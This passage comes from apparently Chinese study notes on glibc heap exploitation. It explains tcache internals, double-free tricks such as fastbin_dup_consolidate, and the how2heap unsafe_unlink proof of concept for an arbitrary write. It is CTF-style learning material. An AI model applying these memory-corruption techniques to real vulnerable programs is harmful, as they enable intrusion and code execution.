dis=write_ptr-flags;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;write_ptr - fp: 0x%xn"</span>,dis);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> write_base=&amp;(fp-&gt;_IO_write_base);</span><br><span class="line">    dis=write_base-flags;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;write_base - fp: 0x%xn"</span>,dis);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> vtable_offset=&amp;(fp-&gt;_vtable_offset);</span><br><span class="line">    dis=vtable_offset-flags;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;vtable_offset - fp: 0x%xn"</span>,dis);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">int</span> read_ptr=&amp;(fp-&gt;_IO_read_ptr);</span><br><span class="line">    dis=read_ptr-flags;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;read_ptr - fp: 0x%xn"</span>,dis);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="examples"><a href="#examples" class="headerlink" title="examples"></a>examples</h3><h3 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="IO FILE"></a>IO FILE</h3><p>本段将跟随一篇系列教程进行学习 ，<a href="https://ray-cp.github.io/archivers/IO_FILE_fopen_analysis" target="_blank" rel="noopener">原文</a></p><h2 id="doublefree"><a href="#doublefree" class="headerlink" title="doublefree"></a>doublefree</h2><p>由堆块头部形成的隐式链s表可知，一个需释放堆块相邻的堆块有两个：<em>前一个块<em>（由当前块头指针加pre_size确定），</em>后一个块<em>（由当前块头指针加size确定）。从而，在合并堆块时会存在两种情况：</em>向后合并<em>、</em>向前合并*。当前一个块和当前块合并时，叫做向后合并。当后一个块和当前块合并时，叫做向前合并。<br>*相关代码</em><br>malloc.c int_free函数中相关代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char \*) (p)) + (s)))</span></span><br><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)      \</span></span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> \*) (p)) + (s)))-&gt;<span class="built_in">size</span> &amp; PREV_INUSE)</span><br><span class="line"></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="comment">/* consolidate backward \*/</span>                    <span class="comment">// "向后合并"</span></span><br><span class="line">     <span class="keyword">if</span> (!prev_inuse(p)) &#123;                           <span class="comment">//如果前一个块为空闲，则进行合并</span></span><br><span class="line">       prevsize = p-&gt;prev_size;                      <span class="comment">//获得前一个块大小</span></span><br><span class="line">       <span class="built_in">size</span> += prevsize;                             <span class="comment">//合并后堆块大小</span></span><br><span class="line">       p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));   <span class="comment">//根据当前块指针和前一个块大小，确定前一个块位置，即合并后块位置</span></span><br><span class="line">       unlink(av, p, bck, fwd);                      <span class="comment">//利用unlink从显式链表Unsorted bin取下前一个块</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      nextchunk = chunk_at_offset(p, <span class="built_in">size</span>);                 <span class="comment">//根据当前块指针和当前块大小， 确定后一个块位置，</span></span><br><span class="line">      nextsize = chunksize(nextchunk);                      <span class="comment">//获得后一个块大小</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize); <span class="comment">//根据下一个块的下一个块的PREV_INUSE位，判断下一个块是否空闲</span></span><br><span class="line">      <span class="comment">/* consolidate forward \*/</span>                <span class="comment">// "向前合并"</span></span><br><span class="line">     <span class="keyword">if</span> (!nextinuse) &#123;                          <span class="comment">//如果后一个块为空闲，则进行合并</span></span><br><span class="line">       unlink(av, nextchunk, bck, fwd);         <span class="comment">//使用unlink将后一个块从unsorted bin中取下</span></span><br><span class="line">       <span class="built_in">size</span> += nextsize;                        <span class="comment">//扩大当前块大小即可完成向前合并</span></span><br><span class="line">     &#125; <span class="keyword">else</span></span><br><span class="line">     clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><h2 id="Tcache-Attack"><a href="#Tcache-Attack" class="headerlink" title="Tcache Attack"></a>Tcache Attack</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#tcache-makes-heap-exploitation-easy-again" target="_blank" rel="noopener">参考ctf-wiki</a></p><p><a href="https://xz.aliyun.com/t/7350" target="_blank" rel="noopener">四个bin在tcache中的规定</a></p><h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><p>glibc在编译时使用use_tcache条件来开启tcache机制，定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS        64      <span class="comment">//每个线程默认使用64个单链表结构的bins</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_SIZE    tidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When "x" is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When "x" is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span>     <span class="comment">//64位机器以16B递增，从24B到1032B，32位机器以8B递增，从12B到512B，因此tcache bin只用于存放non-large的chunk</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7        <span class="comment">//每个bins最多存放7个chunk</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><strong>tcache中新增的两个结构体</strong></p><p> tcache_entry 和 tcache_perthread_struct</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span> <span class="comment">//每个被放入相应bins中的chunk都会在其用户数据中包含一个tcache_entry（FD指针）.指向bins中的下一个chunk，构成单链表</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p><strong>其中两个重要的函数，tcache_get() 和tcache_put()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* tchache_get 中，仅仅检查了tc_idx,此外，我们可以将tcache当作一个类似于fastbin的单链表，只是它的check，没有fastbin那么复杂，仅仅检查tcache-&gt;entries[tc_idx]=e-&gt;next</span></span><br></pre></td></tr></table></figure><p>这两个函数会在函数 <a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l4173" target="_blank" rel="noopener">_int_free</a> 和 <a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3051" target="_blank" rel="noopener">__libc_malloc</a> 的开头被调用，其中 <code>tcache_put</code> 当所请求的分配大小不大于<code>0x408</code>并且当给定大小的 tcache bin 未满时调用。一个 tcache bin 中的最大块数<code>mp_.tcache_count</code>是<code>7</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.</span></span><br><span class="line"><span class="comment">Each   tcache bin will hold at most this number of chunks. */</span> </span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="触发在tcache中放入chunk的操作"><a href="#触发在tcache中放入chunk的操作" class="headerlink" title="触发在tcache中放入chunk的操作"></a>触发在tcache中放入chunk的操作</h3><p>free时，在fastbin操作之前进行，如果chunk size符合要求，并且对应的bins还没有装满，则将其放入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx (<span class="built_in">size</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">  &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>malloc时，如果fastbin中成功返回了要给需要的chunk，那么对应fastbin中的其他chunk会被放进相应的tcache bin 中，直到上线。需要注意的是，chunks在tcache bin 的顺序和在fastbin中的顺序是反过来的</p><ul><li><ul><li><pre><code class="c"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span>    <span class="comment">/* While we're here, if we see other chunks of the same size,</span><span class="comment">   stash them in the tcache.  */</span>    <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);    <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)  {    mchunkptr tc_victim;    <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span>    <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count       &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)      {        <span class="keyword">if</span> (SINGLE_THREAD_P)      *fb = tc_victim-&gt;fd;        <span class="keyword">else</span>      {        REMOVE_FB (fb, pp, tc_victim);        <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))          <span class="keyword">break</span>;      }        tcache_put (tc_victim, tc_idx);      }  }<span class="meta">#<span class="meta-keyword">endif</span></span>&lt;!--￼<span class="number">36</span>--&gt;</code></pre></li></ul></li></ul><p>通过将一个内存块释放两次，那么申请一个出来，就可以修改其fd指针了，控制之后申请返回的地址为任意地址，fastbin的话还需要满足地址+8（也就是size字段）处的值是在对应fastbin范围内，比如栗子中fastbin的大小是0x20，那么指定的其他地址处，size字段值应该是0x20~0x2f。但是对于tcache来说就简单多了，没有double free检测，没有size字段的检测。</p><p>栈中伪造了一个0x20大小堆，然后通过free(a), free(b), free(a)构成一个doublefree（原理同fastbin_dup), 此时fastbin的链接状态为a-&gt;b-&gt;a。然后再次申请两个0x8大小的堆，由于fastbin的lifo，此时fastbin中只剩下a，且此时堆a存在于fastbin和用户申请的堆中，即我们可以控制一个存在与fastbin的堆的内容。容易想到的一种利用方式是伪造fastbin链表的内容，进而达到伪造地址处申请堆的效果。 </p><p>在a地址其后开辟的空间中 存放了&amp;stack_var的地址，此时堆a的fd指向 &amp;stack_var, 即fastbin:a-&gt;stack_var, 此时第二次申请不超过0x18大小的堆（64位系统，跟申请堆时字节对齐有关，返回的堆的大小会被转换成满足条件的最小2*size_se的倍数， 最大0x10+8， 8字节可占用下一个堆的prev_size）即可返回站地址的伪造处</p><p>fastbin采用LIFO（后进先出，即后释放的插入链表头）特点 ，先申请，后释放，在申请就可以得到原来地址的块</p><h3 id="fastbin-dup-consolidate-合并"><a href="#fastbin-dup-consolidate-合并" class="headerlink" title="fastbin_dup_consolidate(合并)"></a>fastbin_dup_consolidate(合并)</h3><p> fastbin attack构成doublefree的一个示例。原理是利用申请一次largebin大小的堆会将fastbin的堆进行合并进入unsortedbin的处理流程，此时再次free fastbin中的堆会绕过free时对fastbin链表头节点的检查进而构成一次doublefree。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"><span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x40</span>);  <span class="comment">//avoid consolidat3e to top chunk</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p1); now the fastbn:p1</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x400</span>); <span class="comment">//alloc a large chunk</span></span><br><span class="line"><span class="comment">//cause now the fastbin is empty</span></span><br><span class="line"><span class="comment">//this alloc triggers fastbin consolidate</span></span><br><span class="line"><span class="comment">//get the fastbin chunks to the unsorted bin</span></span><br><span class="line"><span class="comment">//which pass the freee's fastbin check</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p1);  <span class="comment">//p1 is not in fastbin, this free doesn't cause error</span></span><br></pre></td></tr></table></figure><p> 从下图free的流程中我们可以看出free时只会检查释放fastbin大小的堆时被释放的堆是否和fastbin的头结点是否一致，而在申请0x400的largechunk时，fastbin链表非空，fastbin中的堆会进行合并并且进入unsortedbin的处理流程，在unsortedbin的处理流程中符合fastbin大小的堆会被放入smallbin，这样就绕过了free时对fastbin头结点的检查，从而可以构成一次对fastbin大小的堆的doublefree。</p><p><img src="/images/Heap/t01c19c09cfc9bafae6.png" alt="img"></p><h3 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h3><p><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsafe_unlink.c" target="_blank" rel="noopener">github</a></p><p> 堆可以溢出到下一个堆的size域且存在一个指向堆的指针时堆溢出的一种利用方式。</p><p>利用unlink将已经构造好的chunk释放掉达到任意地址写的目的。</p><p>程序源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome to unsafe unlink 2.0!\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 14.04/16.04 64bit.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line"><span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The global chunk0_ptr is at %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The victim chunk we are going to corrupt is at %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We create a fake chunk inside chunk0.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Fake chunk fd: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Fake chunk bk: %p\n\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (fd-&gt;prev_size)\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&amp;(~ 0x7))"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"If x = chunk0_ptr[1] &amp; (~ 0x7), that is x = *(chunk0_ptr + x)."</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We just need to set the *(chunk0_ptr + x) = x, so we can pass the check"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1.Now the x = chunk0_ptr[1]&amp;(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it's fine to pass"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3.Finally we can also set chunk0_ptr = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">1</span>] = <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Therefore, we set the 'size' of our fake chunk to the value of chunk0_ptr[-3]: 0x%08lx\n"</span>, chunk0_ptr[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span>);</span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n"</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"</span>);</span><br><span class="line">chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span>);</span><br><span class="line"><span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"chunk0_ptr 